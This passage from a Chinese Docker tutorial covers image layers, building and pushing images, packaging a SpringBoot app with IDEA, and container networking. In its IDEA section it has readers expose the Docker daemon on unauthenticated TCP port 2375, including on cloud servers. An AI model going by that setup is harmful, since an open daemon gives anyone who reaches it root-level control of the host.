bootfs包含了BootLoader和Linux内核，用户是不能对这层作任何修改的，在内核启动之后，bootfs会自动卸载。\n* rootfs则包含了系统上的常见的目录结构，包括`/dev`、` /proc`、 `/bin`等等以及一些基本的文件和命令，也就是我们进入系统之后能够操作的整个文件系统，包括我们在Ubuntu下使用的apt和CentOS下使用的yum，都是用户空间上的。\n\nbase镜像底层会直接使用宿主主机的内核，也就是说你的Ubuntu内核版本是多少，那么base镜像中的CentOS内核版本就是多少，而rootfs则可以在不同的容器中运行多种不同的版本。所以，base镜像实际上只有CentOS的rootfs，因此只有300M大小左右，当然，CentOS里面包含多种基础的软件，还是比较臃肿的，而某些操作系统的base镜像甚至都不到10M。\n\n使用`uname`命令可以查看当前内核版本：\n\n![image-20220701135056123](https://s2.loli.net/2022/07/01/mZjupCUktL7Ab2R.png)\n\n因此，Docker能够同时模拟多种Linux操作系统环境，就不足为奇了，我们可以尝试启动一下刚刚下载的base镜像：\n\n```sh\ndocker run -it centos\n```\n\n注意这里需要添加`-it`参数进行启动，其中`-i`表示在容器上打开一个标准的输入接口，`-t`表示分配一个伪tty设备，可以支持终端登录，一般这两个是一起使用，否则base容器启动后就自动停止了。\n\n![image-20220701135834325](https://s2.loli.net/2022/07/01/13BYcCWHsDMrwvq.png)\n\n可以看到使用ls命令能够查看所有根目录下的文件，不过很多命令都没有，连clear都没有，我们来看看内核版本：\n\n![image-20220701140018095](https://s2.loli.net/2022/07/01/PtGwRWfXlTh67qm.png)\n\n可以看到内核版本是一样的（这也是缺点所在，如果软件对内核版本有要求的话，那么此时使用Docker就直接寄了），我们输入`exit`就可以退出容器终端了，可以看到退出后容器也停止了：\n\n![image-20220701140225415](https://s2.loli.net/2022/07/01/u5MQnWVihlbkyx1.png)\n\n当然我们也可以再次启动，注意启动的时候要加上`-i`才能进入到容器进行交互，否则会在后台运行：\n\n![image-20220701140706977](https://s2.loli.net/2022/07/01/QCsY5EyGSja6Khl.png)\n\n基于base镜像，我们就可以在这基础上安装各种各样的软件的了，几乎所有的镜像都是通过在base镜像的基础上安装和配置需要的软件构建出来的：\n\n![image-20220701143105247](https://s2.loli.net/2022/07/01/SDwEqz2b7lA9nJa.png)\n\n每安装一个软件，就在base镜像上一层层叠加上去，采用的是一种分层的结构，这样多个容器都可以将这些不同的层次自由拼装，比如现在好几个容器都需要使用CentOS的base镜像，而上面运行的软件不同，此时分层结构就很爽了，我们只需要在本地保存一份base镜像，就可以给多个不同的容器拼装使用，是不是感觉很灵活？\n\n我们看到除了这些软件之外，最上层还有一个可写容器层，这个是干嘛的呢，为什么要放在最上面？\n\n我们知道，所有的镜像会叠起来组成一个统一的文件系统，如果不同层中存在相同位置的文件，那么上层的会覆盖掉下层的文件，最终我们看到的是一个叠加之后的文件系统。当我们需要修改容器中的文件时，实际上并不会对镜像进行直接修改，而是在最顶上的容器层（最上面一般称为容器层，下面都是镜像层）进行修改，不会影响到下面的镜像，否则镜像就很难实现多个容器共享了。所以各个操作如下：\n\n* 文件读取：要读取一个文件，Docker会最上层往下依次寻找，找到后则打开文件。\n* 文件创建和修改：创建新文件会直接添加到容器层中，修改文件会从上往下依次寻找各个镜像中的文件，如果找到，则将其复制到容器层，再进行修改。\n* 删除文件：删除文件也会从上往下依次寻找各个镜像中的文件，一旦找到，并不会直接删除镜像中的文件，而是在容器层标记这个删除操作。\n\n也就是说，我们对整个容器内的文件进行的操作，几乎都是在最上面的容器层进行的，我们是无法干涉到下面所有的镜像层文件的，这样就很好地保护了镜像的完整性，才能实现多个容器共享使用。\n\n### 构建镜像\n\n前面我们已经了解了Docker镜像的结构，实际上所有常用的应用程序都有对应的镜像，我们只需要下载这些镜像然后就可以使用了，而不需要自己去手动安装，顶多需要进行一些特别的配置。当然要是遇到某些冷门的应用，可能没有提供镜像，这时就要我们手动去安装，接着我们就来看看如何构建我们自己的Docker镜像。构建镜像有两种方式，一种是使用`commit`命令来完成，还有一种是使用Dockerfile来完成，我们先来看第一种。\n\n这里我们就做一个简单的例子，比如我们现在想要在Ubuntu的base镜像中安装Java环境，并将其打包为新的镜像（这个新的镜像就是一个包含Java环境的Ubuntu系统镜像）\n\n咱们先启动Ubuntu镜像，然后使用`yum`命令（跟apt比较类似）来安装Java环境，首先是`run`命令：\n\n```sh\ndocker pull ubuntu\n```\n\n![image-20220701151405640](https://s2.loli.net/2022/07/01/tP5rhQuqfpxcRHL.png)\n\n接着启动：\n\n![image-20220701151433520](https://s2.loli.net/2022/07/01/l86G4dK71UwcZPi.png)\n\n直接使用apt命令来安装Java环境，在这之前先更新一下，因为是最小安装所以本地没有任何软件包：\n\n![image-20220701151600847](https://s2.loli.net/2022/07/01/RAzQr7P8C9aJwxK.png)\n\n接着输入：\n\n```sh\napt install openjdk-8-jdk\n```\n\n等待安装完成：\n\n![image-20220701152018041](https://s2.loli.net/2022/07/01/Fezitl7PDb19BL4.png)\n\n这样，我们就完成了对Java环境的安装了，接着我们就可以退出这个镜像然后将其构建为新的镜像：\n\n![image-20220701152130041](https://s2.loli.net/2022/07/01/LAIx5GYCJhsbmSo.png)\n\n使用`commit`命令可以将容器保存为新的镜像：\n\n```sh\ndocker commit 容器名称/ID 新的镜像名称\n```\n\n![image-20220701152302171](https://s2.loli.net/2022/07/01/sbWLlEoMj2ZPcUV.png)\n\n![image-20220701152418060](https://s2.loli.net/2022/07/01/3q4juA8vOJew9W6.png)\n\n可以看到安装了软件之后的镜像大小比我们原有的大小大得多，这样我们就可以通过这个镜像来直接启动一个带Java环境的Ubuntu操作系统容器了。不过这种方式虽然自定义度很高，但是Docker官方并不推荐，这样的话使用者并不知道镜像是如何构建出来的，是否里面带了后门都不知道，并且这样去构建效率太低了，如果要同时构建多种操作系统的镜像岂不是要一个一个去敲？我们作为普通用户实际上采用Dokcerfile的方式会更好一些。\n\n我们来看看如何使用Dockerfile的形式创建一个带Java环境的Ubuntu系统镜像。首先直接新建一个名为`Dockerfile`的文件：\n\n```sh\ntouch Dockerfile\n```\n\n接着我们来进行编辑，`Dockerfile`内部需要我们编写多种指令来告诉Docker我们的镜像的相关信息：\n\n```dockerfile\nFROM <基础镜像>\n```\n\n首先我们需要使用FROM指令来选择当前镜像的基础镜像（必须以这个指令开始），这里我们直接使用`ubuntu`作为基础镜像即可，当然如果不需要任何基础镜像的话，直接使用`scratch`表示从零开始构建，这里就不演示了。\n\n基础镜像设定完成之后，我们就需要在容器中运行命令来安装Java环境了，这里需要使用`RUN`指令：\n\n```dockerfile\nRUN apt update\nRUN apt install -y openjdk-8-jdk\n```\n\n每条指令执行之后，都会生成一个新的镜像层。\n\nOK，现在我们的Dockerfile就编写完成了，只需要完成一次构建即可：\n\n```sh\ndocker build -t <镜像名称> <构建目录>\n```\n\n执行后，Docker会在构建目录中寻找Dockerfile文件，然后开始依次执行Dockerfile中的指令：\n\n![image-20220701155443170](https://s2.loli.net/2022/07/01/g6RFwA5t4EsdvnY.png)\n\n构建过程的每一步都非常清晰地列出来了，一共三条指令对应三步依次进行，我们稍微等待一段时间进行安装，安装过程中所以的日志信息会直接打印到控制台（注意Docker镜像构建有缓存机制，就算你现在中途退出了，然后重新进行构建，也会直接将之前已经构建好的每一层镜像，直接拿来用，除非修改了Dockerfile文件重新构建，只要某一层发生变化其上层的构建缓存都会失效，当然包括`pull`时也会有类似的机制）\n\n![image-20220701155812315](https://s2.loli.net/2022/07/01/foLHIZScQ1KVbvC.png)\n\n最后成功安装，会出现在本地：\n\n![image-20220701155847721](https://s2.loli.net/2022/07/01/95ueUgyaTcrz6Mi.png)\n\n可以看到安装出来的大小跟我们之前的是一样的，因为做的事情是一模一样的。我们可以使用`history`命令来查看构建历史：\n\n![image-20220701160128689](https://s2.loli.net/2022/07/01/GYyHFcjSKJwvWi6.png)\n\n可以看到最上面两层是我们通过使用apt命令生成的内容，就直接作为当前镜像中的两层镜像，每层镜像都有一个自己的ID，不同的镜像大小也不一样。而我们手动通过`commit`命令来生成的镜像没有这个记录：\n\n![image-20220701160406891](https://s2.loli.net/2022/07/01/qWUeSF3aKrvwJ8p.png)\n\n如果遇到镜像ID为missing的一般是从Docker Hub中下载的镜像会有这个问题，但是问题不大。用我们自己构建的镜像来创建容器就可以直接体验带Java环境的容器了：\n\n![image-20220701161546279](https://s2.loli.net/2022/07/01/STmdFvBIbN4VAl1.png)\n\n有关Dockerfile的其他命令，我们还会在后续的学习中逐步认识。\n\n### 发布镜像到远程仓库\n\n前面我们学习了如何构建一个Docker镜像，我们可以将自己的镜像发布到Docker Hub中，就像Git远程仓库一样，我们可以将自己的镜像上传到这里：https://hub.docker.com/repositories，没有账号的先去进行注册。\n\n![image-20220701164609666](https://s2.loli.net/2022/07/01/3T8xJLgER4cWuQq.png)\n\n点击右上角的创建仓库，然后填写信息：\n\n![image-20220701164939268](https://s2.loli.net/2022/07/01/SkCKJmU6Rw2lfzP.png)\n\n创建完成后，我们就有了一个公共的镜像仓库，我们可以将本地的镜像上传了，上传之前我们需要将镜像名称修改得规范一点，这里使用`tag`命令来重新打标签：\n\n```sh\ndocker tag ubuntu-java-file:latest 用户名/仓库名称:版本\n```\n\n这里我们将版本改成1.0版本吧，不用默认的latest了。\n\n![image-20220701165231001](https://s2.loli.net/2022/07/01/chAPS2DFW5q7GkE.png)\n\n修改完成后，会创建一个新的本地镜像，名称就是我们自己定义的了。接着我们需在本地登录一下：\n\n![image-20220701165446859](https://s2.loli.net/2022/07/01/T3YC4pfaLEo85Oz.png)\n\n登录成功后我们就可以上传了：\n\n```sh\ndocker push nagocoler/ubuntu-java:1.0\n```\n\n![image-20220701165744647](https://s2.loli.net/2022/07/01/CXoBhpZUl79aDRQ.png)\n\n哈哈，500M的东西传上去，还是有点压力的，如果实在太慢各位可以重新做一个简单点的镜像。上传完成后，打开仓库，可以看到已经有一个1.0版本了：\n\n![image-20220701165920060](https://s2.loli.net/2022/07/01/3UD9y8frEIX1JY6.png)\n\n![image-20220701170053250](https://s2.loli.net/2022/07/01/9sVSjcGCo5mTu61.png)\n\n注意公共仓库是可以被搜索和下载的，所以我们这里把本地的镜像全部删掉，去下载我们刚刚上传好的镜像。这里我们先搜索一下，搜索使用`search`命令即可：\n\n```sh\ndocker search nagocoler/ubuntu-java\n```\n\n![image-20220701170253126](https://s2.loli.net/2022/07/01/SIUpBOzN5vsiydn.png)\n\n我们可以使用pull命令将其下载下来：\n\n```sh\ndocker pull nagocoler/ubuntu-java:1.0\n```\n\n![image-20220701171148334](https://s2.loli.net/2022/07/01/uXBk3WPsDM4aZKo.png)\n\n上传之后的镜像是被压缩过的，所以下载的内容就比较少一些。运行试试看：\n\n![image-20220701171253440](https://s2.loli.net/2022/07/01/RJVdstMnxjSYFoW.png)\n\n当然各位也可以让自己的同学或是在其他机器上尝试下载自己的镜像，看看是不是都可以正常运行。\n\nDocker Hub也可以自行搭建私服，但是这里就不多做介绍了，至此，有关容器和镜像的一些基本操作就讲解得差不多了。\n\n### 实战：使用IDEA构建SpringBoot程序镜像\n\n这里我们创建一个新的SpringBoot项目，现在我们希望能够使用Docker快速地将我们的SpringBoot项目部署到安装了Docker的服务器上，我们就可以将其打包为一个Docker镜像。\n\n![image-20220701173902376](https://s2.loli.net/2022/07/01/QObHMsxAtej6lPq.png)\n\n先创建好一个项目让它跑起来，可以正常运行就没问题了，接着我们需要将其打包为Docker镜像，这里创建一个新的Dockerfile：\n\n```dockerfile\nFROM ubuntu\nRUN apt update && apt install -y openjdk-8-jdk\n```\n\n首先还是基于ubuntu构建一个带Java环境的系统镜像，接着我们先将其连接到我们的Docker服务器进行构建，由于IDEA自带了Docker插件，所以我们直接点击左上角的运行按钮，选择第二项 **“为Dockerfile构建镜像”**：\n\n![image-20220701203741495](https://s2.loli.net/2022/07/01/xB5vEw1QHojWZ8p.png)\n\n![image-20220701202537650](https://s2.loli.net/2022/07/01/FAcME5yxZPD1aoz.png)\n\n这里需要配置Docker的服务器，也就是我们在Ubuntu服务器安装的Docker，这里我们填写服务器相关信息，我们首选需要去修改一下Docker的一些配置，开启远程客户端访问：\n\n```sh\nsudo vim /etc/systemd/system/multi-user.target.wants/docker.service \n```\n\n打开后，添加高亮部分：\n\n![image-20220701202846707](https://s2.loli.net/2022/07/01/OVMDGqiYWU9E7fA.png)\n\n修改完成后，重启Docker服务，如果是云服务器，记得开启2375 TCP连接端口：\n\n```sh\nsudo systemctl daemon-reload\nsudo systemctl restart docker.service \n```\n\n现在接着在IDEA中进行配置：\n\n![image-20220701203318098](https://s2.loli.net/2022/07/01/bDn3vHFw1XYdusU.png)\n\n在引擎API URL处填写我们Docker服务器的IP地址：\n\n```\ntcp://IP:2375\n```\n\n显示连接成功后，表示配置正确，点击保存即可，接着就开始在我们的Docker服务器上进行构建了：\n\n![image-20220701203518930](https://s2.loli.net/2022/07/01/nPFSa4Wcep31jXG.png)\n\n最后成功构建：\n\n![image-20220701204815069](https://s2.loli.net/2022/07/01/1qtCFZKbg6fJsok.png)\n\n可以看到，Docker服务器上已经有了我们刚刚构建好的镜像：\n\n![image-20220701204900943](https://s2.loli.net/2022/07/01/a6J43UW5biwTyVo.png)\n\n不过名称没有指定，这里我们重新配置一下：\n\n![image-20220701204955570](https://s2.loli.net/2022/07/01/edPVg4oyrDiqmk6.png)\n\n![image-20220701205053642](https://s2.loli.net/2022/07/01/1QrHVB4zC9iFTG7.png)\n\n重新进行构建，就是我们自定义的名称了：\n\n![image-20220701205402607](https://s2.loli.net/2022/07/01/qrWDZEKHklSU8OT.png)\n\n![image-20220701205350004](https://s2.loli.net/2022/07/01/6JKXLHEz25QGvMk.png)\n\n我们来创建一个容器试试看：\n\n![image-20220701205500494](https://s2.loli.net/2022/07/01/8xPUg7qmVzXF9nN.png)\n\n好了，现在基本环境搭建好了，我们接着就需要将我们的SpringBoot项目打包然后再容器启动时运行了，打开Maven执行打包命令：\n\n![image-20220701205630885](https://s2.loli.net/2022/07/01/CRLi2uJcXhzqPHF.png)\n\n接着我们需要编辑Dockerfile，将我们构建好的jar包放进去：\n\n```dockerfile\nCOPY target/DockerTest-0.0.1-SNAPSHOT.jar app.jar\n```\n\n这里需要使用COPY命令来将文件拷贝到镜像中，第一个参数是我们要拷贝的本地文件，第二个参数是存放在Docker镜像中的文件位置，由于还没有学习存储管理，这里我们直接输入`app.jar`直接保存在默认路径即可。\n\n接着我们就需要指定在启动时运行我们的Java程序，这里使用CMD命令来完成：\n\n```dockerfile\nFROM ubuntu\nRUN apt update && apt install -y openjdk-8-jdk\nCOPY target/DockerTest-0.0.1-SNAPSHOT.jar app.jar\nCMD java -jar app.jar\n# EXPOSE 8080\n```\n\nCMD命令可以设定容器启动后执行的命令，EXPOSE可以指定容器需要暴露的端口，但是现在我们还没有学习网络相关的知识，所以暂时不使用，这里指定为我们启动Java项目的命令。配置完成后，重新构建：\n\n![image-20220701210438145](https://s2.loli.net/2022/07/01/NgCLJbRQc1lMqna.png)\n\n可以看到历史中已经出现新的步骤了：\n\n![image-20220701213513862](https://s2.loli.net/2022/07/01/gpfn4EqjMbZh1Nd.png)\n\n接着启动我们的镜像，我们可以直接在IDEA中进行操作，不用再去敲命令了，有点累：\n\n![image-20220701210845768](https://s2.loli.net/2022/07/01/t2MV3Tu6IcrK8Dl.png)\n\n![image-20220701210908997](https://s2.loli.net/2022/07/01/JqajY8EdVbGNhiF.png)\n\n启动后可以在右侧看到容器启动的日志信息：\n\n![image-20220701210946261](https://s2.loli.net/2022/07/01/jreyMHzcX8LTh3k.png)\n\n![image-20220701211029119](https://s2.loli.net/2022/07/01/OGAj3Rr59iVLqfe.png)\n\n但是我们发现启动之后并不能直接访问，这是为什么呢？这是因为容器内部的网络和外部网络是隔离的，我们如果想要访问容器内的服务器，需要将对应端口绑定到宿主机上，让宿主主机也开启这个端口，这样才能连接到容器内：\n\n```sh\ndocker run -p 8080:8080 -d springboot-test:1.0\n```\n\n这里`-p`表示端口绑定，将Docker容器内的端口绑定到宿主机的端口上，这样就可以通过宿主的8080端口访问到容器的8080端口了（有关容器网络管理我们还会在后面进行详细介绍），`-d`参数表示后台运行，当然直接在IDEA中配置也是可以的：\n\n![image-20220701211536598](https://s2.loli.net/2022/07/01/dXQlEBIDzU6YTLG.png)\n\n配置好后，点击重新创建容器：\n\n![image-20220701211701640](https://s2.loli.net/2022/07/01/6G7hbmW81uBsKFc.png)\n\n重新运行后，我们就可以成功访问到容器中运行的SpringBoot项目了：\n\n![image-20220701211753962](https://s2.loli.net/2022/07/01/7xNrfWcvC58hQ4q.png)\n\n当然，为了以后方便使用，我们可以直接将其推送到Docker Hub中，这里我们还是创建一个新的公开仓库：\n\n![image-20220701212330425](https://s2.loli.net/2022/07/01/oTXBtlPV7j3C6a9.png)\n\n这次我们就使用IDEA来演示直接进行镜像的上传，直接点击：\n\n![image-20220701212458851](https://s2.loli.net/2022/07/01/91tKnXDWaeFqcrx.png)\n\n接着我们需要配置一下我们的Docker Hub相关信息：\n\n![image-20220701212637581](https://s2.loli.net/2022/07/01/tMcD2kzNwW9J7d3.png)\n\n![image-20220701212731276](https://s2.loli.net/2022/07/01/kgTlz3m61ZrHx5s.png)\n\nOK，远程镜像仓库配置完成，直接推送即可，等待推送完成。\n\n![image-20220701212902977](https://s2.loli.net/2022/07/01/H5UfWXC2nKVeray.png)\n\n可以看到远程仓库中已经出现了我们的镜像，然后IDEA中也可以同步看到：\n\n![image-20220701213026214](https://s2.loli.net/2022/07/01/mgRKV2SWb9YxBGr.png)\n\n这样，我们就完成了使用IDEA将SpringBoot项目打包为Docker镜像。\n\n***\n\n## 容器网络管理\n\n**注意：**本小节学习需要掌握部分《计算机网络》课程中的知识。\n\n前面我们学习了容器和镜像的一些基本操作，了解了如何通过镜像创建容器、然后自己构建容器，以及远程仓库推送等，这一部分我们接着来讨论容器的网络管理。\n\n### 容器网络类型\n\nDocker在安装后，会在我们的主机上创建三个网络，使用`network ls`命令来查看：\n\n```sh\ndocker network ls\n```\n\n![image-20220702161742741](https://s2.loli.net/2022/07/02/7KEumyqriRY2QU5.png)\n\n可以看到默认情况下有`bridge`、`host`、`none`这三种网络类型（其实有点像虚拟机的网络配置，也是分桥接、共享网络之类的），我们先来依次介绍一下，在开始之前我们先构建一个镜像，默认的ubuntu镜像由于啥软件都没有，所以我们把一会网络要用到的先提前装好：\n\n```sh\ndocker run -it ubuntu\n```\n\n```sh\napt update\napt install net-tools iputils-ping curl\n```\n\n这样就安装好了，我们直接退出然后将其构建为新的镜像：\n\n```sh\ndocker commit lucid_sammet ubuntu-net\n```\n\n![image-20220702170441267](https://s2.loli.net/2022/07/02/NIGfx25Un83EV7Q.png)\n\nOK，一会我们就可以使用了。\n\n* **none网络：**这个网络除了有一个本地环回网络之外，就没有其他的网络了，我们可以在创建容器时指定这个网络。\n\n  这里使用`--network`参数来指定网络：\n\n  ```sh\n  docker run -it --network=none ubuntu-net\n  ```\n\n  进入之后，我们可以直接查看一下当前的网络：\n\n  ```sh\n  ifconfig\n  ```\n\n  可以看到只有一个本地环回`lo`网络设备：\n\n  ![image-20220702170000617](https://s2.loli.net/2022/07/02/qL1oAkOCcIYRwZj.png)\n\n  所以这个容器是无法连接到互联网的：\n\n  ![image-20220702170531312](https://s2.loli.net/2022/07/02/xzSp4hTBkeFqCd3.png)\n\n  “真”单机运行，可以说是绝对的安全，没人能访问进去，存点密码这些还是不错的。\n\n* **bridge网络：**容器默认使用的网络类型，这是桥接网络，也是应用最广泛的网络类型：\n\n  实际上我们在宿主主机上查看网络信息，会发现有一个名为docker0的网络设备：\n\n  ![image-20220702172102410](https://s2.loli.net/2022/07/02/jDKSIriXec96uhy.png)\n\n  这个网络设备是Docker安装时自动创建的虚拟设备，它有什么用呢？我们可以来看一下默认创建的容器内部的情况：\n\n  ```sh\n  docker run -it ubuntu-net\n  ```\n\n  ![image-20220702172532004](https://s2.loli.net/2022/07/02/5JdimQWMaCx7hy2.png)\n\n  可以看到容器的网络接口地址为172.17.0.2，实际上这是Docker创建的虚拟网络，就像容器单独插了一根虚拟的网线，连接到Docker创建的虚拟网络上，而docker0网络实际上作为一个桥接的角色，一头是自己的虚拟子网，另一头是宿主主机的网络。\n\n  网络拓扑类似于下面这样：\n\n  ![image-20220702173005750](https://s2.loli.net/2022/07/02/xCKMIBwjq7gWOko.png)\n\n  通过添加这样的网桥，我们就可以对容器的网络进行管理和控制，我们可以使用`network inspect`命令来查看docker0网桥的配置信息：\n\n  ```sh\n  docker network inspect bridge\n  ```\n\n  ![image-20220702173431530](https://s2.loli.net/2022/07/02/86XdZUejEuk1P3i.png)\n\n  这里的配置的子网是172.17.0.0，子网掩码是255.255.0.0，网关是172.17.0.1，也就是docker0这个虚拟网络设备，所以我们上面创建的容器就是这个子网内分配的地址172.17.0.2了。\n\n  之后我们还会讲解如何管理和控制容器网络。\n\n* **host网络：**当容器连接到此网络后，会共享宿主主机的网络，网络配置也是完全一样的：\n\n  ```sh\n  docker run -it --network=host ubuntu-net\n  ```\n\n  可以看到网络列表和宿主主机的列表是一样的，不知道各位有没有注意到，连hostname都是和外面一模一样的：\n\n  ![image-20220702170754656](https://s2.loli.net/2022/07/02/cRAQtIxV4D9byCu.png)\n\n  只要宿主主机能连接到互联网，容器内部也是可以直接使用的：\n\n  ![image-20220702171041631](https://s2.loli.net/2022/07/02/lVsc1mpihq54Pue.png)\n\n  这样的话，直接使用宿主的网络，传输性能基本没有什么折损，而且我们可以直接开放端口等，不需要进行任何的桥接：\n\n  ```sh\n   apt install -y systemctl nginx\n   systemctl start nginx\n  ```\n\n  安装Nginx之后直接就可以访问了，不需要开放什么端口：\n\n  ![image-20220702171550979](https://s2.loli.net/2022/07/02/1JnY6KyVpXOwbtl.png)\n\n  相比桥接网络就方便得多了。\n\n我们可以根据实际情况，来合理地选择这三种网络使用。\n\n### 用户自定义网络\n\n除了前面我们介绍的三种网络之外，我们也可以自定义自己的网络，让容器连接到这个网络。\n\nDocker默认提供三种网络驱动：`bridge`、`overlay`、`macvlan`，不同的驱动对应着不同的网络设备驱动，实现的功能也不一样，比如bridge类型的，其实就和我们前面介绍的桥接网络是一样的。\n\n我们可以使用`network create`来试试看：\n\n```sh\ndocker network create --driver bridge test\n```\n\n这里我们创建了一个桥接网络，名称为test：\n\n![image-20220702180837819](https://s2.loli.net/2022/07/02/piCtK8kdRALHSIu.png)\n\n可以看到新增了一个网络设备，这个就是一会负责我们容器网络的网关了，和之前的docker0是一样的：\n```sh\ndocker network inspect test\n```\n\n![image-20220702181150667](https://s2.loli.net/2022/07/02/uLwAD4YC3UFXQt7.png)\n\n这里我们创建一个新的容器，使用此网络：\n\n```sh\n docker run -it --network=test ubuntu-net\n```\n\n![image-20220702181252137](https://s2.loli.net/2022/07/02/Iy2BwDoZsLMO8gJ.png)\n\n成功得到分配的IP地址，是在这个网络内的，注意不同的网络之间是隔离的，我们可以再创建一个容器试试看：\n\n![image-20220702181808792](https://s2.loli.net/2022/07/02/b14dflKGMunULQI.png)\n\n可以看到不同的网络是相互隔离的，无法进行通信，当然我们也为此容器连接到另一个容器所属的网络下：\n\n```sh\ndocker network connect test 容器ID/名称\n```\n\n![image-20220702182050204](https://s2.loli.net/2022/07/02/WzvhI63ydfeJStA.png)\n\n这样就连接了一个新的网络：\n\n![image-20220702182146049](https://s2.loli.net/2022/07/02/lxqrz36sVUjNdI4.png)\n\n可以看到容器中新增了一个网络设备连接到我们自己定义的网络中，现在这两个容器在同一个网络下，就可以相互ping了：\n![image-20220702182310008](https://s2.loli.net/2022/07/02/WBlC9PheETO64xq.png)\n\n这里就不介绍另外两种类型的网络了，他们是用于多主机通信的，目前我们只学习单机使用。\n\n### 容器间网络\n\n我们首先来看看容器和容器之间的网络通信，实际上我们之前已经演示过ping的情况了，现在我们创建两个ubuntu容器：\n\n```sh\ndocker run -it ubuntu-net\n```\n\n先获取其中一个容器的网络信息：\n\n![image-20220702175353454](https://s2.loli.net/2022/07/02/yTEcg4l2kASBnQu.png)\n\n我们可以直接在另一个容器中ping这个容器：\n\n![image-20220702175444713](/Users/nagocoler/Library/Application Support/typora-user-images/image-20220702175444713.png)\n\n可以看到能够直接ping通，因为这两个容器都是使用的bridge网络，在同一个子网中，所以可以互相访问。\n\n我们可以直接通过容器的IP地址在容器间进行通信，只要保证两个容器处于同一个网络下即可，虽然这样比较方便，但是大部分情况下，容器部署之后的IP地址是自动分配的（当然也可以使用`--ip`来手动指定，但是还是不方便），我们无法提前得知IP地址，那么有没有一直方法能够更灵活一些呢？\n\n我们可以借助Docker提供的DNS服务器，它就像是一个真的DNS服务器一样，能够对域名进行解析，使用很简单，我们只需要在容器启动时给个名字就行了，我们可以直接访问这个名称，最后会被解析为对应容器的IP地址，但是注意只会在我们用户自定义的网络下生效，默认的网络是不行的：\n\n```sh\ndocker run -it --name=test01 --network=test ubuntu-net\ndocker run -it --name=test02 --network=test ubuntu-net\n```\n\n接着直接ping对方的名字就可以了：\n\n![image-20220702192457354](https://s2.loli.net/2022/07/02/lKCFY6ec17N4b5y.png)\n\n可以看到名称会自动解析为对应的IP地址，这样的话就不用担心IP不确定的问题了。\n\n当然我们也可以让两个容器同时共享同一个网络，注意这里的共享是直接共享同一个网络设备，两个容器共同使用一个IP地址，只需要在创建时指定：\n\n```sh\ndocker run -it --name=test01 --network=container:test02 ubuntu-net\n```\n\n这里将网络指定为一个容器的网络，这样两个容器使用的就是同一个网络了：\n\n![image-20220702200711351](https://s2.loli.net/2022/07/02/Wb6jODxFP3r1mE7.png)\n\n可以看到两个容器的IP地址和网卡的Mac地址是完全一样的，它们的网络现在是共享状态，此时在容器中访问，localhost，既是自己也是别人。\n\n我们可以在容器1中，安装Nginx，然后再容器2中访问：\n\n```sh\n apt install -y systemctl nginx\n systemctl start nginx\n```\n\n![image-20220702201348722](https://s2.loli.net/2022/07/02/WTn9OMYmLZJXtBz.png)\n\n成功访问到另一个容器中的Nginx服务器。\n\n### 容器外部网络\n\n前面我们介绍了容器之间的网络通信，我们接着来看容器与外部网络的通信。\n\n首先我们来看容器是如何访问到互联网的，在默认的三种的网络下，只有共享模式和桥接模式可以连接到外网，共享模式实际上就是直接使用宿主主机的网络设备连接到互联网，这里我们主要来看一下桥接模式。\n\n通过前面的学习，我们了解到桥接模式实际上就是创建一个单独的虚拟网络，让容器在这个虚拟网络中，然后通过桥接器来与外界相连，那么数据包是如何从容器内部的网络到达宿主主机再发送到互联网的呢？实际上整个过程中最关键的就是依靠NAT（Network Address Translation）将地址进行转换，再利用宿主主机的IP地址发送数据包出去。\n\n这里我们就来补充一下《计算机网络》课程中学习的NAT：\n\n实际上NAT在我们生活中也是经常见到的，比如我们要访问互联网上的某个资源，要和服务器进行通信，那么就需要将数据包发送出去，同时服务器也要将数据包发送回来，我们可以知道服务器的IP地址，也可以直接去连接，因为服务器的IP地址是暴露在互联网上的，但是我们的局域网就不一样了，它仅仅局限在我们的家里，比如我们连接了家里的路由器，可以得到一个IP地址，但是你会发现，这个IP公网是无法直接访问到我们的，因为这个IP地址仅仅是一个局域网的IP地址，俗称内网IP，既然公网无法访问到我们，那服务器是如何将数据包发送给我们的呢？\n\n![image-20220702230700124](https://s2.loli.net/2022/07/02/LxtQ68HzEVYKdjW.png)\n\n实际上这里就借助了NAT在帮助我们与互联网上的服务器进行通信，通过NAT，可以实现将局域网的IP地址，映射为对应的公网IP地址，而NAT设备一端连接外网，另一端连接内网的所有设备，当我们想要与外网进行通信时，就可以将数据包发送给NAT设备，由它来将数据包的源地址映射为它在外网上的地址，这样服务器就能够发现它了，能够直接与它建立通信。当服务器发送数据回来时，也是直接交给NAT设备，然后再根据地址映射，转发给对应的内网设备（当然由于公网IP地址有限，所以一般采用IP+端口结合使用的形式ANPT）\n\n所以你打开百度直接搜IP，会发现这个IP地址并不是你本地的，而是NAT设备的公网地址：\n\n![image-20220702231458928](https://s2.loli.net/2022/07/02/uAW9GH1b6xkDB3T.png)\n\n实际上我们家里的路由器一般都带有NAT功能，默认开启NAT模式，包括我们的小区也是有一个NAT设备在进行转换的，这样你的电脑才能在互联网的世界中遨游。当然NAT也可以保护内网的设备不会直接暴露在公网，这样也会更加的安全，只有当我们主动发起连接时，别人才能知道我们。\n\n当然，我们的Docker也是这样的，实际上内网的数据包想要发送到互联网上去，那么就需要经过这样的一套流程：\n\n![image-20220702232449520](https://s2.loli.net/2022/07/02/ktEA5O9BrmxXbPz.png)\n\n这样，Docker容器使用的内网就可以和外网进行通信了。\n\n但是这样有一个问题，单纯依靠NAT的话，只有我们主动与外界联系时，外界才能知道我们，但是现在我们的容器中可能会部署一些服务，需要外界来主动连接我们，此时该怎么办呢？\n\n我们可以直接在容器时配置端口映射，还记得我们在第一节课部署Nginx服务器吗？\n\n```sh\ndocker run -d -p 80:80 nginx\n```\n\n这里的`-p`参数实际上是进行端口映射配置，端口映射可以将容器需要对外提供服务的端口映射到宿主主机的端口上，这样，当外部访问到宿主主机的对应端口时，就会直接转发给容器内映射的端口了。规则为`宿主端口:容器端口`，这里配置的是将容器的80端口映射到宿主主机的80端口上。\n\n![image-20220702233420287](https://s2.loli.net/2022/07/02/WQzEVTwePNaHYgG.png)\n\n一旦监听到宿主主机的80端口收到了数据包，那么会直接转发给对应的容器。所以配置了端口映射之后，我们才可以从外部正常访问到容器内的服务：\n\n![image-20220630165440751](https://s2.loli.net/2022/07/02/VY5imqeG9jlAz8d.png)\n\n我们也可以直接输入`docker ps`查看端口映射情况：\n\n![image-20220702233831651](https://s2.loli.net/2022/07/02/dyDhNRvQ7Bzixka.png)\n\n至此，有关容器的网络部分，就到此为止，当然这仅仅是单机下的容器网络操作，在以后的课程中，我们还会进一步学习多主机下的网络配置。\n\n***\n\n## 